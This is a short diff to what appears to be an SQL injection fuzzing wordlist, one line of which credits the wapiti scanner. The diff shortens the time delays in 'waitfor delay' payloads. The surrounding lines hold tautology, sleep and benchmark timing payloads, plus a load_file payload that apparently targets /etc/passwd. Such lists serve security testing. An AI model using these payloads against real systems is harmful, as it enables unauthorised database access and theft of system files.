@@ -27,7 +27,8 @@ asc
 " or benchmark(10000000,MD5(1))#
 # from wapiti
  or 0=0 --
-1 waitfor delay '0:0:10'--
+1 waitfor delay '0:0:5'--
+1 waitfor delay '0:0:0'--
  or 'a'='a
 hi or 1=1 --"
 or a = a
@@ -45,7 +46,7 @@ PRINT
 hi') or ('a'='a
  or 3=3
 ));waitfor delay '0:0:__TIME__'--
-a' waitfor delay '0:0:10'--
+a' waitfor delay '0:0:3'--
 1;(load_file(char(47,101,116,99,47,112,97,115, ...
 or%201=1
 1 or sleep(__TIME__)#
